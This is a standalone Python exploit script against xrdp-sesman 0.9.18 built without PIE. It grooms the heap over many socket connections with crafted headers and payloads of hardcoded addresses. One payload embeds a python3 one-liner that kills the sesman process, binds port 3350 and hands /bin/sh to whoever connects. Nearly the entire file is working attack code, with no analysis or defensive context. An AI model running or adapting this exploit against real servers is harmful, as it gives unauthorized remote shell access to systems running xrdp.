#no PIE/xrdp-sesman 0.9.18

import socket
import struct
import time
import os

def pack_addr2():
    sdata = b"\xba\xc9\x40\x00\x00\x00\x00\x00"
    return sdata

con_list=[0]*300
for i in range(14):
    con_list[i] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    con_list[i].connect(("0.0.0.0",9999))
    sdata = b''
    sdata += struct.pack("I",0x2222CCCC) #version
    sdata += struct.pack(">I",0x80000000) #headersize
    con_list[i].send(sdata)
    sdata = pack_addr2()*0x3f0
    con_list[i].send(sdata)
    time.sleep(0.05)

con_list[14] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
con_list[14].connect(("0.0.0.0",9999))
con_list[15] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
con_list[15].connect(("0.0.0.0",9999))

sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[15].send(sdata)
sdata = b'D'*0x10
con_list[15].send(sdata)
######


sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[9].send(sdata)
sdata = b'C'*0x21b8+b"\xb1\x02\x00\x00\x00\x00\x00\x00"+b"\x00\x01\x00\x00\x00\x00\x00\x00"+b"\x01\x00\x00\x00"*2#bash+type+status
sdata+=b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\xba\xc9\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
sdata+=b"\x00\x00\x00\x7f\x00\x00\x00\x00"+b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\x00\x05\x41\x00\x00\x00\x00\x00"#ar_addr
sdata+=b"\x00\x00\x00\x00\x00\x00\x00\x00"*4
sdata+=b"\x00"*0x220+b"\x70\x3a\x40\x00\x00\x00\x00\x00"+b"\xf0\x3a\x40\x00\x00\x00\x00\x00"
sdata+=b"\x64\x54\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
con_list[9].send(sdata)

sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[10].send(sdata)


################
sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[13].send(sdata)
sdata = b'C'*0x21b8+b"\xb1\x02\x00\x00\x00\x00\x00\x00"+b"\x00\x01\x00\x00\x00\x00\x00\x00"+b"\x01\x00\x00\x00"*2#bash+type+status
sdata+=b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\xba\xc9\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
sdata+=b"\x00\x00\x00\x7f\x00\x00\x00\x00"+b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\xf8\x04\x41\x00\x00\x00\x00\x00"#ar_addr
sdata+=b"\x00\x00\x00\x00\x00\x00\x00\x00"*4
sdata+=b"\x00"*0x220+b"\x70\x3a\x40\x00\x00\x00\x00\x00"+b"\xf0\x3a\x40\x00\x00\x00\x00\x00"
sdata+=b"\x64\x54\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
con_list[13].send(sdata)

sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[14].send(sdata)

#########
time.sleep(1)
#########

sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[12].send(sdata)
sdata = b'C'*0x21b8+b"\xb1\x02\x00\x00\x00\x00\x00\x00"+b"\x00\x01\x00\x00\x00\x00\x00\x00"+b"\x01\x00\x00\x00"*2#bash+type+status
sdata+=b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\xba\xc9\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
sdata+=b"\x00\x00\x00\x7f\x00\x00\x00\x00"+b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\xf0\x04\x41\x00\x00\x00\x00\x00"#ar_addr
sdata+=b"\x00\x00\x00\x00\x00\x00\x00\x00"*4
sdata+=b"\x00"*0x220+b"\x70\x3a\x40\x00\x00\x00\x00\x00"+b"\xf0\x3a\x40\x00\x00\x00\x00\x00"
sdata+=b"\x64\x54\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
con_list[12].send(sdata)

sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[13].send(sdata)
#########
time.sleep(1)
#########

sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[15].send(sdata)
sdata = b"X"*0x40b0+b"python3 -c\'import socket,os,time,re;[os.close(i+4) for i in range(19)];t=os.popen(\"netstat -nap|grep 3350\");p=t.read();k=re.split(\"/\",p);p=k[0][-2::];os.popen(\"kill \"+p);time.sleep(5);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"\",3350));s.listen();c,_=s.accept();f=c.fileno();os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);os.system(\"sh\");\' 2>/stderr3\x00".ljust(912,b'\x00')+b"-c\x00\x00\x00\x00\x00\x00"+b"\x00"*0x388+b"/bin/sh\x00"
con_list[15].send(sdata)

#########
time.sleep(1)
#########


sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[11].send(sdata)
sdata = b'C'*0x21b8+b"\xb1\x02\x00\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"+b"\x01\x00\x00\x00"*2#bash+type+status
sdata+=b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\xba\xc9\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
sdata+=b"\x00\x00\x00\x7f\x00\x00\x00\x00"+b"\x00\x00\x02\x00\x00\x00\x00\x00"+b"\x92\x04\x41\x00\x00\x00\x00\x00"#ar_addr
sdata+=b"\x00\x00\x00\x00\x00\x00\x00\x00"*4
sdata+=b"\x00"*0x220+b"\xb0\x4f\x40\x00\x00\x00\x00\x00"+b"\xf0\x3a\x40\x00\x00\x00\x00\x00"
sdata+=b"\x64\x54\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
con_list[11].send(sdata)

sdata = b''
sdata += struct.pack("I",0x2222CCCC) #version
sdata += struct.pack(">I",0x80000000) #headersize
con_list[12].send(sdata)

#########
time.sleep(1)
#########

#sdata = b''
#sdata += struct.pack("I",0x2222CCCC) #version
#sdata += struct.pack(">I",0x80000000) #headersize
#con_list[8].send(sdata)
sdata = b'C'*0x21c0+b"\xb1\x02\x00\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"+b"\x01\x00\x00\x00"*2#bash+type+status
sdata+=b"\x02\x00\x00\x00\x00\x00\x00\x00"+b"\xba\xc9\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
sdata+=b"\x00\x00\x00\x7f\x00\x00\x00\x00"+b"\x00\x00\x00\x08\x00\x00\x00\x00"+b"\x92\x04\x41\x00\x00\x00\x00\x00"#ar_addr
sdata+=b"\x00\x00\x00\x00\x00\x00\x00\x00"*4
sdata+=b"\x00"*0x220+b"\x87\x95\x40\x00\x00\x00\x00\x00"+b"\x87\x95\x40\x00\x00\x00\x00\x00"
sdata+=b"\x64\x54\x40\x00\x00\x00\x00\x00"+b"\x00\x00\x00\x00\x00\x00\x00\x00"
con_list[8].send(sdata)
print("Done!")


